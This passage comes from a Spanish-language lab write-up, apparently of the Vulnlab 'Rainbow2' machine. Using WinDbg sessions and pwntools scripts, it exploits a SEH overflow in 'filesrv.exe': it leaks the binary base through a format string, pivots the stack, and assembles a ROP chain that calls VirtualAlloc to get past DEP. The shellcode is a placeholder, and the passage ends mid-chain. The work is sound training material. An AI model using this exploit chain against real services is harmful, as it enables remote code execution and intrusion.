+eip=3f2de8ea esp=0150f1b4 ebp=0150f1c4 iopl=0         nv up ei pl nz na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010207
+filesrv+0x4e8ea:
+3f2de8ea 8838            mov     byte ptr [eax],bh          ds:002b:01510000=??  
+
+</span><span class="ro">0:000></span><span class="p"> !exchain
+0150fda4: 43434343
+Invalid exception stack at 42424242</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En explotaciones normales usariamos un <code class="language-plaintext highlighter-rouge">pop; pop; ret;</code> que ejecutaría el <code class="language-plaintext highlighter-rouge">nseh</code> como opcode sin embargo como <code class="language-plaintext highlighter-rouge">DEP</code> está habilitado el stack no es ejecutable</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> !vprot esp
+BaseAddress:       00cef000
+AllocationBase:    00bf0000
+AllocationProtect: 00000004  PAGE_READWRITE  
+RegionSize:        00001000
+State:             00001000  MEM_COMMIT
+Protect:           00000004  PAGE_READWRITE  
+Type:              00020000  MEM_PRIVATE</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Lo que podriamos hacer es ejecutar una cadena <code class="language-plaintext highlighter-rouge">rop</code> para bypassear <code class="language-plaintext highlighter-rouge">DEP</code>, para ello antes necesitamos controlar stack ya que ahora solo sobrescribimos el controlador, iniciamos buscando en el stack la cadena <code class="language-plaintext highlighter-rouge">TEST</code> que apunta al inicio del buffer</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> !teb
+TEB at 00cb4000
+    ExceptionList:        0159e7b4
+    StackBase:            015a0000
+    StackLimit:           0159d000
+    SubSystemTib:         00000000
+    FiberData:            00001e00
+    ArbitraryUserPointer: 00000000
+    Self:                 00cb4000
+    EnvironmentPointer:   00000000
+    ClientId:             00002f90 . 00000470
+    RpcHandle:            00000000
+    Tls Storage:          00fb2f00
+    PEB Address:          00ca1000
+    LastErrorValue:       187
+    LastStatusValue:      c000000d
+    Count Owned Locks:    0
+    HardErrorMode:        0
+
+</span><span class="ro">0:000></span><span class="p"> s -a 0x0159d000 0x015a0000 TEST
+0159f4f0  54 45 53 54 00 f9 59 01-db 8d c5 3f 4c f9 59 01  TEST..Y....?L.Y.  
+
+</span><span class="ro">0:000></span><span class="p"> db 0x0159f4f0
+0159f4f0  54 45 53 54 00 f9 59 01-db 8d c5 3f 4c f9 59 01  TEST..Y....?L.Y.
+0159f500  04 00 00 00 0f 00 00 00-b8 6f fb 00 00 00 fa 00  .........o......
+0159f510  7c f5 59 01 64 60 22 77-a0 0f 00 00 af 0f 00 00  |.Y.d`"w........
+0159f520  28 69 ca 62 00 00 fa 00-00 00 00 00 62 00 00 40  (i.b........b..@
+0159f530  4c f6 59 01 c8 0f 00 00-00 00 00 00 0f 00 00 00  L.Y.............
+0159f540  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+0159f550  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+0159f560  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Entonces, <code class="language-plaintext highlighter-rouge">0x50</code> bytes después de la dirección de la string encontramos el inicio de las <code class="language-plaintext highlighter-rouge">A's</code>, si restamos esa dirección al <code class="language-plaintext highlighter-rouge">esp</code> podemos ver que está a <code class="language-plaintext highlighter-rouge">0xda0</code> bytes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> db 0x0159f4f0 + 0x50
+0159f540  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
+0159f550  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
+0159f560  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
+0159f570  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
+0159f580  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
+0159f590  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
+0159f5a0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
+0159f5b0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
+
+</span><span class="ro">0:000></span><span class="p"> ? 0x0159f540 - esp
+Evaluate expression: 3488 = 00000da0</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Buscando un stack pivot con <code class="language-plaintext highlighter-rouge">ropper</code> encontramos 2 posibles, el primero es muy corto, entonces usaremos el segundo que aunque se pasa un poco nos servirá</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ropper</span><span class="p"> --file filesrv.exe --search</span><span class="am"> "add esp, 0x???; ret;"  </span><span class="p">
+</span><span class="ve">[INFO]</span><span class="p"> Load gadgets from cache
+</span><span class="ve">[LOAD]</span><span class="p"> loading... 100%
+</span><span class="ve">[LOAD]</span><span class="p"> removing double gadgets... 100%
+</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: add esp, 0x???; ret;
+
+</span><span class="ve">[INFO]</span><span class="p"> File: filesrv.exe
+</span><span class="ro">0x0001139d</span><span class="p">:</span><span class="am"> add</span><span class="p"> esp, 0xd60</span><span class="az">;</span><span class="am"> ret</span><span class="az">;</span><span class="p">
+</span><span class="ro">0x00011396</span><span class="p">:</span><span class="am"> add</span><span class="p"> esp, 0xe10</span><span class="az">;</span><span class="am"> ret</span><span class="az">;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Actualizamos nuestro exploit, ahora el controlador apunta al <code class="language-plaintext highlighter-rouge">stack pivot</code> por lo que cuando ocurra la excepción saltará a él haciendo que el <code class="language-plaintext highlighter-rouge">esp</code> apunte a las <code class="language-plaintext highlighter-rouge">A's</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, p32
+
+shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"192.168.100.5"</span><span class="p">,</span><span class="mi"> 2121</span><span class="p">)
+
+shell.sendline(</span><span class="no">b</span><span class="s">"TEST %p.%p"</span><span class="p">)
+shell.recvuntil(</span><span class="no">b</span><span class="s">"."</span><span class="p">)
+
+binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip(), </span><span class="mi">16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x14120</span><span class="p">  
+
+offset</span><span class="o"> =</span><span class="mi"> 1032</span><span class="p">
+junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
+
+nseh</span><span class="o"> =</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
+seh</span><span class="o"> =</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x11396</span><span class="p">)</span><span class="c1"> # add esp, 0xe10; ret;</span><span class="p">
+
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> +=</span><span class="p"> nseh</span><span class="o"> +</span><span class="p"> seh
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"D"</span><span class="o"> *</span><span class="p"> (</span><span class="mi">4000</span><span class="o"> -</span><span class="no"> len</span><span class="p">(payload))
+
+shell.sendline(</span><span class="no">b</span><span class="s">"TEST "</span><span class="o"> +</span><span class="p"> payload)
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecuutar nuestro exploit corrompe nuevamente, aunque el <code class="language-plaintext highlighter-rouge">nseh</code> sigue apuntando a las <code class="language-plaintext highlighter-rouge">B's</code> el controlador ahora apunta a la dirección del gadget <code class="language-plaintext highlighter-rouge">add esp, 0xe10; ret;</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000> </span><span class="p">g
+(12a4.13f8): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00b20000 ebx=00004444 ecx=00b1f170 edx=00000000 esi=00b1f184 edi=00b1f5cc
+eip=3f2de8ea esp=00b1f148 ebp=00b1f158 iopl=0         nv up ei pl nz na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010207
+filesrv+0x4e8ea:
+3f2de8ea 8838            mov     byte ptr [eax],bh          ds:002b:00b20000=4d  
+
+</span><span class="ro">0:000></span><span class="p"> !exchain
+00b1fd38: filesrv+11396 (3f2a1396)
+Invalid exception stack at 42424242
+
+</span><span class="ro">0:000></span><span class="p"> u 0x3f2a1396 L2
+filesrv+0x11396:
+3f2a1396 81c4100e0000    add     esp,0E10h
+3f2a139c c3              ret</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Establecemos un breakpoint en el y al continuar la ejecución eventualmente llega a ejecutarlo, ejecutamos el <code class="language-plaintext highlighter-rouge">add esp, 0xe10</code> y avanzamos hasta la instrucción <code class="language-plaintext highlighter-rouge">ret</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> bp 0x3f2a1396
+
+</span><span class="ro">0:000></span><span class="p"> g
+Breakpoint 0 hit
+eax=00000000 ebx=00000000 ecx=3f2a1396 edx=77666f60 esi=00000000 edi=00000000  
+eip=3f2a1396 esp=00b1eb98 ebp=00b1ebb8 iopl=0         nv up ei pl zr na pe nc  
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
+filesrv+0x11396:
+3f2a1396 81c4100e0000    add     esp,0E10h
+
+</span><span class="ro">0:000></span><span class="p"> p
+eax=00000000 ebx=00000000 ecx=3f2a1396 edx=77666f60 esi=00000000 edi=00000000  
+eip=3f2a139c esp=00b1f9a8 ebp=00b1ebb8 iopl=0         nv up ei pl nz na po nc  
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202  
+filesrv+0x1139c:
+3f2a139c c3              ret</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aunque retorna a las <code class="language-plaintext highlighter-rouge">A's</code> sabemos que el pivot avanzó mas de lo que deberia y necesitamos saber cuánto, entonces nuevamente buscamos el inicio del buffer</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> !teb
+TEB at 003b7000
+    ExceptionList:        00b1ebac
+    StackBase:            00b20000
+    StackLimit:           00b1e000
+    SubSystemTib:         00000000
+    FiberData:            00001e00
+    ArbitraryUserPointer: 00000000
+    Self:                 003b7000
+    EnvironmentPointer:   00000000
+    ClientId:             000012a4 . 000013f8
+    RpcHandle:            00000000
+    Tls Storage:          006513a0
+    PEB Address:          003a4000
+    LastErrorValue:       187
+    LastStatusValue:      c000000d
+    Count Owned Locks:    0
+    HardErrorMode:        0
+
+</span><span class="ro">0:000></span><span class="p"> s -a 0x00b1e000 0x00b20000 TEST
+00b1f8e0  54 45 53 54 00 fd b1 00-db 8d 29 3f 3c fd b1 00  TEST......)?&lt...  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si rstamos la dirección del <code class="language-plaintext highlighter-rouge">esp</code> con la dirección donde inician las <code class="language-plaintext highlighter-rouge">A's</code> nos devuelve el offset, esto lo dividimos entre el tamaño de un <code class="language-plaintext highlighter-rouge">dword</code> y nos devuelve un <code class="language-plaintext highlighter-rouge">30</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> db 0x00b1f8e0
+00b1f8e0  54 45 53 54 00 fd b1 00-db 8d 29 3f 3c fd b1 00  TEST......)?&lt...  
+00b1f8f0  03 00 00 00 0f 00 00 00-b0 4a 65 00 00 00 00 00  .........Je.....  
+00b1f900  08 3e 65 00 00 00 64 00-80 0c 00 00 8f 0c 00 00  .>e...d.........  
+00b1f910  58 02 64 00 0b 29 6b 77-00 00 00 00 00 00 64 00  X.d..)kw......d.  
+00b1f920  93 01 00 00 62 00 00 40-00 00 00 00 0f 00 00 00  ....b..@........  
+00b1f930  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
+00b1f940  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
+00b1f950  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
+
+</span><span class="ro">0:000></span><span class="p"> ? (esp - 0x00b1f930) / 4
+Evaluate expression: 30 = 0000001e</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Entonces, nuestra cadena rop enviará <code class="language-plaintext highlighter-rouge">30</code> veces la dirección del gadget <code class="language-plaintext highlighter-rouge">ret;</code> hasta llegar al verdadero ropchain, luego de ejecutarlo dejaremos <code class="language-plaintext highlighter-rouge">C's</code> como shellcode</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, p32
+
+shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"192.168.100.5"</span><span class="p">,</span><span class="mi"> 2121</span><span class="p">)
+
+shell.sendline(</span><span class="no">b</span><span class="s">"TEST %p.%p"</span><span class="p">)
+shell.recvuntil(</span><span class="no">b</span><span class="s">"."</span><span class="p">)
+
+binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip(), </span><span class="mi">16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x14120</span><span class="p">  
+
+rop</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x01010</span><span class="p">)</span><span class="o"> *</span><span class="mi"> 30</span><span class="c1"> # ret;</span><span class="p">
+
+shellcode</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 100</span><span class="p">
+
+offset</span><span class="o"> =</span><span class="mi"> 1032</span><span class="p">
+junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (offset </span><span class="o">- </span><span class="no">len</span><span class="p">(rop</span><span class="o"> +</span><span class="p"> shellcode))
+
+nseh</span><span class="o"> =</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
+seh</span><span class="o"> =</span><span class="p"> p32(binary_base </span><span class="o">+</span><span class="mi"> 0x11396</span><span class="p">)</span><span class="c1"> # add esp, 0xe10; ret;</span><span class="p">
+
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> rop
+payload</span><span class="o"> +=</span><span class="p"> shellcode
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> +=</span><span class="p"> nseh</span><span class="o"> +</span><span class="p"> seh
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"D"</span><span class="o"> *</span><span class="p"> (</span><span class="mi">4000</span><span class="o"> -</span><span class="no"> len</span><span class="p">(payload))
+
+shell.sendline(</span><span class="no">b</span><span class="s">"TEST "</span><span class="o"> +</span><span class="p"> payload)
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar el exploit eventualmente llegamos al <code class="language-plaintext highlighter-rouge">ret</code> que ejecutará el ropchain real, como no enviamos ninguno el retorno apunta a las <code class="language-plaintext highlighter-rouge">C's</code> que simulan el shellcode</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> bp filesrv + 0x1010
+
+</span><span class="ro">0:000></span><span class="p"> g
+Breakpoint 0 hit
+eax=00000000 ebx=00000000 ecx=3f2a1396 edx=77666f60 esi=00000000 edi=00000000  
+eip=3f291010 esp=00cef514 ebp=00cee720 iopl=0         nv up ei pl nz na po nc  
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202  
+filesrv+0x1010:
+3f291010 c3              ret
+
+</span><span class="ro">0:000></span><span class="p"> dds esp L1
+00cef514  43434343</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La función <a href="https://learn.microsoft.com/es-es/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">VirtualAlloc</a> nos servirá para cambiar los privilegios del stack debido a que reserva un espacio en memoria, lo mas relevante es que en el primer argumento podemos indicar la dirección donde queremos hacerlo y con el último la protección</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">LPVOID</span><span class="na"> VirtualAlloc</span><span class="p">(
+  [</span><span class="mi">in</span><span class="p">,</span><span class="mi"> optional</span><span class="p">]</span><span class="no"> LPVOID</span><span class="p"> lpAddress,
+  [</span><span class="mi">in</span><span class="p">]</span><span class="no">           SIZE_T</span><span class="p"> dwSize,
+  [</span><span class="mi">in</span><span class="p">]</span><span class="no">           DWORD</span><span class="p">  flAllocationType,  
+  [</span><span class="mi">in</span><span class="p">]</span><span class="no">           DWORD</span><span class="p">  flProtect
+);</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En el <code class="language-plaintext highlighter-rouge">lpAddress</code> podemos pasar la dirección del <code class="language-plaintext highlighter-rouge">esp</code> donde iniciaremos, en el <code class="language-plaintext highlighter-rouge">dwSize</code> usaremos <code class="language-plaintext highlighter-rouge">0x1</code> que reservará una página, en <code class="language-plaintext highlighter-rouge">flAllocationType</code> pasaremos <code class="language-plaintext highlighter-rouge">MEM_COMMIT</code> o <code class="language-plaintext highlighter-rouge">0x1000</code> y finalmente en <code class="language-plaintext highlighter-rouge">flProtect</code> usaremos <code class="language-plaintext highlighter-rouge">0x40</code> que es igual a <code class="language-plaintext highlighter-rouge">PAGE_EXECUTE_READ_WRITE</code>, de esta forma se nos permitiría ejecutar el shellcode</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">VirtualAlloc(</span><span class="mi">$esp</span><span class="p">,</span><span class="mi"> 0x1</span><span class="p">, </span><span class="mi">0x1000</span><span class="p">,</span><span class="mi"> 0x40</span><span class="p">);  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Algo a tener en cuenta es que los argumentos se pasan en el stack, como tenemos <code class="language-plaintext highlighter-rouge">DEP</code> habilitado hay pocos gadgets que ejecuten un <code class="language-plaintext highlighter-rouge">push</code> de un solo registro sin intentar ejecutar algo más, un método es utilizar el gadget <code class="language-plaintext highlighter-rouge">pushad; ret;</code> que ejecuta un <code class="language-plaintext highlighter-rouge">push</code> de todos los registros en un orden especifico que es el siguiente</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">Temp := (ESP);
+Push(EAX);
+Push(ECX);
+Push(EDX);
+Push(EBX);
+Push(Temp);
+Push(EBP);
+Push(ESI);
+Push(EDI);</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El ultimo argumento <code class="language-plaintext highlighter-rouge">lpAddress</code> indica el inicio de donde reservaremos memoria asi que tenemos que adaptarnos al orden de <code class="language-plaintext highlighter-rouge">pushad</code>, tendremos que guardar los valores de los otros <code class="language-plaintext highlighter-rouge">3</code> argumentos en orden inverso a partir del <code class="language-plaintext highlighter-rouge">push</code> de <code class="language-plaintext highlighter-rouge">Temp</code> o <code class="language-plaintext highlighter-rouge">esp</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">$ecx = flProtect
+$edx = flAllocationType
+$ebx = dwSize
+$esp = lpAddress</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Comenzamos con <code class="language-plaintext highlighter-rouge">ecx</code>, para cargar el valor sin null bytes podemos usar un gadget <code class="language-plaintext highlighter-rouge">sub eax</code> y calcular la diferencia, en este caso sumandole el valor de <code class="language-plaintext highlighter-rouge">0x40</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> ? 0x8314c26b + 0x40
+Evaluate expression: -2095791445 = 8314c2ab  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con el gadget <code class="language-plaintext highlighter-rouge">xchg edi, eax</code> cargamos el valor resultante en <code class="language-plaintext highlighter-rouge">edi</code>, luego tenemos un <code class="language-plaintext highlighter-rouge">mov ecx, edi</code> que finalmente lo guarda en <code class="language-plaintext highlighter-rouge">ecx</code> pero termina en un <code class="language-plaintext highlighter-rouge">call esi</code>, para ello guardaremos en <code class="language-plaintext highlighter-rouge">esi</code> el gadget <code class="language-plaintext highlighter-rouge">pop esi; ret;</code> que saltará al siguiente gadget</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1"># $ecx = 0x40</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x3711a</span><span class="p">)</span><span class="c1"> # pop eax; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x8314c2ab</span><span class="p">)</span><span class="c1">            # 0x40 + offset</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x32ce4</span><span class="p">)</span><span class="c1"> # sub eax, 0x8314c26b; ret;  </span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x01068</span><span class="p">)</span><span class="c1"> # pop esi; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x01068</span><span class="p">)</span><span class="c1"> # pop esi; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x48ca8</span><span class="p">)</span><span class="c1"> # xchg edi, eax; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x15638</span><span class="p">)</span><span class="c1"> # mov ecx, edi; call esi;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En edx necesitamos cargar <code class="language-plaintext highlighter-rouge">0x1000</code>, realizamos exactamente el mismo proceso y terminamos y una vez calculado movemos el valor de <code class="language-plaintext highlighter-rouge">eax</code> al registro <code class="language-plaintext highlighter-rouge">edx</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000> </span><span class="p">? 0x8314c26b + 0x1000
+Evaluate expression: -2095787413 = 8314d26b  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1"># $edx = 0x1000</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x3711a</span><span class="p">)</span><span class="c1"> # pop eax; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x8314d26b</span><span class="p">)</span><span class="c1">            # offset + 0x1000</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x32ce4</span><span class="p">)</span><span class="c1"> # sub eax, 0x8314c26b; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x3039f</span><span class="p">)</span><span class="c1"> # mov edx, eax; mov eax, esi; pop esi; ret;  </span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x41414141</span><span class="p">)</span><span class="c1">            # padding for pop</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para <code class="language-plaintext highlighter-rouge">ebx</code> necesitamos <code class="language-plaintext highlighter-rouge">0x1</code>, esto es un poco mas simple, podemos cargar el valor <code class="language-plaintext highlighter-rouge">0xffffffff</code> o <code class="language-plaintext highlighter-rouge">-1</code> y simplemente incrementar su valor <code class="language-plaintext highlighter-rouge">2</code> veces dejandolo en <code class="language-plaintext highlighter-rouge">1</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1"># $ebx = 0x1</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x0dc14</span><span class="p">)</span><span class="c1"> # pop ebx; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0xffffffff</span><span class="p">)</span><span class="c1">            # -1</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x301e9</span><span class="p">)</span><span class="c1"> # inc ebx; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x301e9</span><span class="p">)</span><span class="c1"> # inc ebx; ret;  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Lamentablemente la función <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> no está cargada en la tabla <code class="language-plaintext highlighter-rouge">IAT</code>, lo que podemos para calcularla hacer es desreferenciar cualquier función como <code class="language-plaintext highlighter-rouge">TlsAlloc</code> y después sumarle el offset hacia la función <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> dentro de <code class="language-plaintext highlighter-rouge">kernel32.dll</code></p>
+<a href="/vulnlab/rainbow2/18.png" target="_blank"><div><p><img src="/vulnlab/rainbow2/18.png"></p></div></a>
+
+<p class="plain-text">Para llegar a la función <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> desde <code class="language-plaintext highlighter-rouge">TlsAlloc</code> necesitaremos ya sea el valor <code class="language-plaintext highlighter-rouge">0x3140</code> o sumar <code class="language-plaintext highlighter-rouge">0xffffcec0</code> al valor previamente desreferenciado</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> ? kernel32!TlsAllocStub - kernel32!VirtualAllocStub  
+Evaluate expression: 12608 = 00003140
+
+</span><span class="ro">0:000></span><span class="p"> ? kernel32!VirtualAllocStub - kernel32!TlsAllocStub  
+Evaluate expression: -12608 = ffffcec0</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Establecemos en <code class="language-plaintext highlighter-rouge">edi</code> el valor <code class="language-plaintext highlighter-rouge">0xffffcec0</code>, luego cargamos y desreferenciamos en <code class="language-plaintext highlighter-rouge">eax</code> la dirección de <code class="language-plaintext highlighter-rouge">TlsAlloc</code> y le sumamos el offset que guardamos antes en <code class="language-plaintext highlighter-rouge">edi</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1"># $eax = VirtualAlloc()</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="p"> 0x15354</span><span class="p">)</span><span class="c1"> # pop edi; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0xffffcec0</span><span class="p">)</span><span class="c1">            # VirtualAlloc() - TlsAlloc()</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x3711a</span><span class="p">)</span><span class="c1"> # pop eax; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x9013c</span><span class="p">)</span><span class="c1"> # TlsAlloc()</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x2bb8e</span><span class="p">)</span><span class="c1"> # mov eax, dword ptr [eax]; ret;  </span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x113a8</span><span class="p">)</span><span class="c1"> # add eax, edi; ret;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nos quedan 3 registros antes de <code class="language-plaintext highlighter-rouge">Temp</code>, en <code class="language-plaintext highlighter-rouge">edi</code> que sera el primero en ejecutarse simplemente ejecutaremos un <code class="language-plaintext highlighter-rouge">ret</code> y pasaremos al valor de <code class="language-plaintext highlighter-rouge">esi</code> que ejecutará <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>, al terminar la función ejecutará el <code class="language-plaintext highlighter-rouge">pop rbp</code> que limpiara el stack para ejecutar la siguiente instrucción que será el salto al shellcode a ejecutar</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1"># $ebp = pop ebp; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x0100f</span><span class="p">)</span><span class="c1"> # pop ebp; ret;</span><span class="p">
